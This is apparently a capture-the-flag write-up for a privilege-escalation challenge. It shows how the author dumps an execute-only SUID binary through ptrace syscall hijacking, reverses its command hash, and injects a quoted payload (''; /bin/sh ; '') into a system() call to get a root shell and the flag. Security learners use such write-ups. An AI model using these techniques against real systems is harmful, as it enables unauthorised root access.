# blind suid

- Category: pwn
- Final point value: 469
- Number of solves: 15

A quite original pwn challenge where you had a shell access and needed to exploit a suid program owned by root to elevate your privileges. The program was execute-only (`-rws--x--x`), I leaked it using `ptrace`, reversed it, and then found out that there was no memory corruption vulnerability in it, but rather the simplest command injection. The biggest difficulty of the challenge was to manage to read it despite the execute-only permission.

## Challenge description

> I wanted something even for more fine-grained for my administration tasks than sudo, so I made minisudo. Good thing I've made it unreadable, so you surely can't pwn it.

> `nc blind-suid.chal-kalmarc.tf 1337`

Of course, no binary was provided...

## Reconnaissance

Being quite familiar with Blind ROP, I immediately went to this challenge when I saw "blind" in its name. I was quite surprised to be asked for a Proof of Work when connecting to the remote, this did not seem compatible with the amount of bruteforcing required by BROP... When connecting, we actually get a shell, and can find an SUID and exec-only program, which asks us for a password:
```
user@chall:/app$ ls -l                                                         
ls -l
total 16
-rws--x--x 1 root root 14472 Mar 18 00:02 minisudo
user@chall:/app$ ./minisudo                                                    
./minisudo
Password: sheep
sheep
Wrong password!
user@chall:/app$
```
I was still influenced by my first idea that it must be a BROP chall, and thus started to bf the buffer size once connected (see `explore_buf` in my [exploit](./exploit.py)), but the program did not seem to crash. I noticed that our input was echoed back, so I thought there may be a Format String Bug allowing us to leak the binary, but it did not work:
```
user@chall:/app$ ./minisudo                                                    
./minisudo
Password: %x
%x
Wrong password!
user@chall:/app$
```
I then understood that the echo was coming from the shell, not from the program. It then seemed that we had to find another way to leak the binary. Trying a few basic linux utilities, I found out that `ltrace` and `gdb` were not present, but `gcc` was, and more interestingly, `strace`:
```
user@chall:/app$ strace ./minisudo
strace ./minisudo
[...]
brk(NULL)                               = 0x5621a7dfa000
brk(0x5621a7e1b000)                     = 0x5621a7e1b000
newfstatat(0, 0x7f1d0082044f, 0x7fff16b69df0, AT_EMPTY_PATH) = 0
write(1, 0x5621a7dfa2a0, 10Password: )            = 10
read(0, sheep
sheep
0x5621a7dfa6b0, 1024)           = 6
write(1, 0x5621a7dfa2a0, 16Wrong password!
)            = 16
exit_group(-1)                          = ?
+++ exited with 255 +++
user@chall:/app$  
```
`strace` seems to be capable of retrieving a heap address, so we may leak some information using `ptrace`! By the way, the fact that we are reading and writing from the heap probably means that the program uses libc IO functions (through `stdin` and `stdout` FILE structs) rather than raw `read` and `write`.

## Dumping the binary with `ptrace`

I knew that `ptrace` was a system call, mainly used by GDB to attach to a program and read information from it. I also had already seen it at use in some rev challs (check for running debugger, nanomites), and in some shellcoding challs (to catch forbidden syscalls). I had however never used it myself. Fortunately, I found the `man` pages, and [this toy debugger](https://github.com/TRIKKSS/trikkssdbg) a friend wrote recently. So I started writing a small [C program](./ptrace.c) that would fork, let the parent attach to the child (`ptrace(PTRACE_TRACEME, 0, 0, 0)` on the child), and then somehow read the memory of the child from the parent. For a start, I was able to read the registers of the child with `ptrace(PTRACE_GETREGS, child, NULL, &registers)` . My first concern was about leaking or disabling ASLR. I found [this code](https://github.com/kccqzy/no-aslr) which used `personality` to disable ASLR, it worked locally (the value of `rip` was always the same), but not remotely... Reading `proc/<pid>/maps` for the child did not work either. One of my team mate had the idea of single stepping the program until `rip` starts with `0x55` or `0x56`, and that worked both locally and remotely. I was however surprised to see that the LSB of the first value of `rip` in this range had some slight variation... I then understood that the proper use of `ptrace` requires the parent to `wait` for the child after single-stepping it. So the correct loop looks like this:
```C
struct user_regs_struct registers;
registers.rip = 0;
while ((registers.rip >> 40) != 0x55 && (registers.rip >> 40) != 0x56) {
            ptrace(PTRACE_SINGLESTEP, child, NULL, NULL);
            waitpid(child, NULL, 0);
            ptrace(PTRACE_GETREGS, child, NULL, &registers);
}
```
Ok, so ASLR is leaked, how do we leak the content of the memory now? Reading `trikkssdbg`'s code further, I found that it is possible to read the child's memory with `PTRACE_PEEKTEXT`, but once again, it worked locally, but not on the remote.
Reading the `man`, I found that it is possible to let the program run until the next syscall with `PTRACE_SYSCALL`. That's what I did, and then hijacked the first syscall after the ASLR leak to replace it by a `write` of the binary, by modifying the syscall number and its arguments with `PTRACE_SETREGS`. It has to be noted that the syscall number is not in `registers.rax`, but in `registers.orig_rax`. I was then leaking the binary to stdout, but had two problems:
1. once the binary was printed to stdout, I could not interact with the remote anyore, it just hung up (but a prompt was shown, weird...)
2. the leak I had was wrong somehow, when opening it in ghidra or iaito I had the impression that some jumps or references were displaced by a few bytes

I though the first one came form the fact that the normal operation of the program was perturbed by the fact I was hijacking a syscall, so I restored the original value of the registers just after my syscall, it did not solve it. I then thought it was due to the stdout being clobbered by funny characters, so I wrote to stderr instead and redirected it to a file, but the program was still hanging. Then I properly let the child continue with `PTRACE_CONT`, and `wait`ed for it to terminate, and it solved my problem. Turns out I was leaving a zombie child before.

Once I had the leak redirected to stderr and into a file, I solved my second problem by sending the dump using base64. I could then `vbindiff` with my previous dump, and see that the shell was actually replacing `\n` by `\r\n`, and thus some `\r` were randomly added to the leaked binary... The final `ptrace` program can be found [here](./ptrace.c), and the full [dump](./dump.bin) is made by the `dump_binary` function in the [Python exploit](./exploit.py).

## Reversing the binary from the dump

The first step of the reverse engineering process is of course to use `strings`. We find a few interesting strings in the binary:
```
K33pth15s3Cret
Password: 
Wrong password!
Correct!
Run commands as root
/bin/ls
/usr/bin/id
/usr/bin/head -c 7 /flag.txt
/usr/bin/wc -c '%s'
/bin/sleep 5
/bin/sleep infinity
Invalid command
```
We have what looks like a password, and a few commands, let's now ~~guess~~ ~~use our intuition~~ proceed methodically:
```
user@chall:/app$ ./minisudo
./minisudo
Password: K33pth15s3Cret
K33pth15s3Cret
Correct!
user@chall:/app$ ./minisudo sheep                                              
./minisudo sheep
Password: K33pth15s3Cret
K33pth15s3Cret
Correct!
Invalid command
user@chall:/app$ ./minisudo /bin/ls                                            
./minisudo /bin/ls
Password: K33pth15s3Cret
K33pth15s3Cret
Correct!
Invalid command
user@chall:/app$ ./minisudo ls                                                 
./minisudo ls
Password: K33pth15s3Cret
K33pth15s3Cret
Correct!
minisudo
user@chall:/app$ ./minisudo id                                                 
./minisudo id
Password: K33pth15s3Cret
K33pth15s3Cret
Correct!
uid=0(root) gid=1000(user) groups=1000(user)
user@chall:/app$
```
So, apprently we can put a keyword for a command as an argument to our program. Among the commands, there is one containing `/flag.txt`, but this file does not exist. The `wc` seems quite suspicious, there may be a command injection there, but `wc` as argument gives an "Invalid command".

Time to actually reverse the program, we fire up ghidra. After a few variable renaming and retyping, we obtain a quite good-looking [C code](./ghidra.c), composed of only one `main` function. As expected, this function first checks the password, then `setreuid` to root. It then somehow hashes the first argument, and chooses a command to run according to this hash. There is indeed a command injection in the `wc` command: the second argument given to the program is simply inserted in the template without any sanitization, and may contain simple quotes:
```C
if (cmd_hash == 0x39403f5da078c2a) {
              plt_snprintf(password_buf,0x20,"/usr/bin/wc -c \'%s\'",argv[2]);
              plt_system(password_buf);
            }
```
So now we need to crack this hash to find which keyword enables this command. Let's take a closer look at it. First, the command is converted to base 26, based on the alphabetic rank of its letters. Non-letter chars are ignored:
```C
for (i = 0; (i < 0xd && (cmd[i] != '\0')); i = i + 1) {
    cmd_hash = cmd_hash * 0x1a;
    if (('@' < cmd[i]) && (cmd[i] < '[')) {
      cmd_hash = cmd_hash + (long)(cmd[i] + -0x41);
    }
    if (('`' < cmd[i]) && (cmd[i] < '{')) {
      cmd_hash = cmd_hash + (long)(cmd[i] + -0x61);
    }
  }
```
Then we have a rotation and XOR, which are of course both reversible operations:
```C
cmd_hash = (cmd_hash ^ 0xaaaaaaaaaaaaaaaa) << 0x14 | (cmd_hash ^ 0xaaaaaaaaaaaaaaaa) >> 0x2c;
```
And finally a few rounds of shifting and XORing, which are similar to the one used in [Safe-Linking](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/), and can also be reversed:
```C
for (j = 0; j < 0x10; j = j + 1) {
    cmd_hash = cmd_hash ^ cmd_hash >> 0xc;
    cmd_hash = cmd_hash ^ cmd_hash << 0x19;
    cmd_hash = cmd_hash ^ cmd_hash >> 0x1b;
  }
```
The idea for reversing it is, the shift + xor leaves X bits of the original value untouched (if X is the value of the shift), so you can recover the next X bits by XORing them with the X bits you know, and so on until you've recovered them all. I implemented it in the [exploit](./exploit.py), see the `unmangle` function. I was then able to recode the hash in Python, and code its reverse too, see `unhash`.
We can then reverse the hash of the keyword associated with the `wc` command, and we find it to be `tellmethesize`. 

## Profit

So, there is no memory corruption in the program, rather a command injection, and we know how to reach it now. Time to try:
```
user@chall:/app$ ./minisudo tellmethesize "'; /bin/sh ; '"
./minisudo tellmethesize "'; /bin/sh ; '"
Password: K33pth15s3Cret
K33pth15s3Cret
Correct!
/usr/bin/wc: invalid zero-length file name
# id
id
uid=0(root) gid=1000(user) groups=1000(user)
# ls -la /root
ls -la /root
total 28
drwx------ 1 root root 4096 Mar 18 00:12 .
drwxr-xr-x 1 root root 4096 Mar 18 00:12 ..
-rw-r--r-- 1 root root 3106 Oct 15  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
-r-------- 1 root root   55 Mar 18 00:02 flag.txt
# cat /root/flag.txt
cat /root/flag.txt
kalmar{probably_not_the_intended_use-case_for_ptrace?}
# 
```

An that's a flag!

## Conclusion

A very nice chall that made me write a very minimalistic debugger and learn how to use `ptrace`. Not completely sure that it strictly belongs to the `pwn` category, since there was no memory corruption in the binary, but it was quite fun to solve anyway, thanks!
